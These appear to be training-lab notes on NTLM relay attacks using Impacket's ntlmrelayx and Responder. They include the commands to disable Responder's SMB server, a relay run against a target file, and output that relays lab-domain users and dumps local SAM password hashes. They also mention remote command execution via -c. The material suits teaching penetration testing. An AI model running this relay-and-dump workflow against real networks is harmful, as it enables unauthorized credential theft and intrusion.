
---
### Impacket's ntlmrelayx
This tool serve as an extension of [smbrelayx.py](https://github.com/fortra/impacket/blob/master/examples/smbrelayx.py) and it is the flagship tool for conducting relay attacks on Linux. Other tools like [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) can also be used.

`ntlmrelayx` is a generic NTLM relay module within Impacket that supports the `NTLM relay` and various post-relay attacks. It provides numerous options that we can utilize for different types of attacks.

```bash
hcx05@htb[/htb]$ ntlmrelayx.py -h

Impacket v0.11.0 - Copyright 2023 Fortra
                  
usage: ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w] [-i] [-ip INTERFACE_IP] [--no-smb-server] [--no-http-server] [--no-wcf-server] [--no-raw-server]         
                     [--smb-port SMB_PORT] [--http-port HTTP_PORT] [--wcf-port WCF_PORT] [--raw-port RAW_PORT] [--no-multirelay] [-ra] [-r SMBSERVER] [-l LOOTDIR]                   
                     [-of OUTPUT_FILE] [-codec CODEC] [-smb2support] [-ntlmchallenge NTLMCHALLENGE] [-socks] [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6] [--remove-mic]                 
                     [--serve-image SERVE_IMAGE] [-c COMMAND] [-e FILE] [--enum-local-admins] [-rpc-mode {TSCH}] [-rpc-use-smb] [-auth-smb [domain/]username[:password]]             
                     [-hashes-smb LMHASH:NTHASH] [-rpc-smb-port {139,445}] [-q QUERY] [-machine-account MACHINE_ACCOUNT] [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN]            
                     [-remove-target] [--no-dump] [--no-da] [--no-acl] [--no-validate-privs] [--escalate-user ESCALATE_USER] [--add-computer [COMPUTERNAME [PASSWORD ...]]]          
                     [--delegate-access] [--sid] [--dump-laps] [--dump-gmsa] [--dump-adcs] [--add-dns-record NAME IPADDR] [-k KEYWORD] [-m MAILBOX] [-a] [-im IMAP_MAX] [--adcs]
                     [--template TEMPLATE] [--altname ALTNAME] [--shadow-credentials] [--shadow-target SHADOW_TARGET] [--pfx-password PFX_PASSWORD] [--export-type {PEM,PFX}]        
                     [--cert-outfile-path CERT_OUTFILE_PATH]

<SNIP>
```

We don't want to capture hash here, so we have to turn off the `SMB` server in `Responder`, change `SMB = on` to `SMB = off` in `Responder/Responder.conf`.

This is because `ntlmrelayx` runs `SMB` or `HTTP` server so it can relay the connection from the clients to the server, and if `Responder` is running those services, we won't be able to use `ntlmrelayx`.
#### Setting Responder's SMB Server to Off
```bash
sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb
```
#### NTLMRelayx SMB attack
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/JPEREZ@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/JPEREZ SUCCEED
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/NPORTS SUCCEED
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target smb://172.16.117.60
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] SMBD-Thread-11: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/PETER SUCCEED
[*] SMBD-Thread-11: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/PETER SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] SMBD-Thread-11: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, but there are no more targets left!
[*] Starting service RemoteRegistry
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
[*] Done dumping SAM hashes for host: 172.16.117.50
[*] Stopping service RemoteRegistry
```
`-t` specifies a single relay target, while `-tf` specifies a file with multiple relay targets. If `-t`/`-tf` is omitted, `ntlmrelayx` will relay the `NTLM` authentication over to the originating host, an attack called the `NTLM` `self-relay` attack (although patched, if we encounter legacy vulnerable hosts, considering this attack might prove helpful). The `-smb2support` option provides SMBv2 support for hosts requiring it.

**Note:** If the NTLM Relay attack does not work, we can restart ntlmrelayx and Responder.

Attack diagram:
![](assets/Pasted%20image%2020261020171809.png)
### Command Execution
Instead of performing a `SAM dump`, we can perform command execution on the target machine using the option `-c "Command To Execute"`, and the commands will be executed via `SMB`.














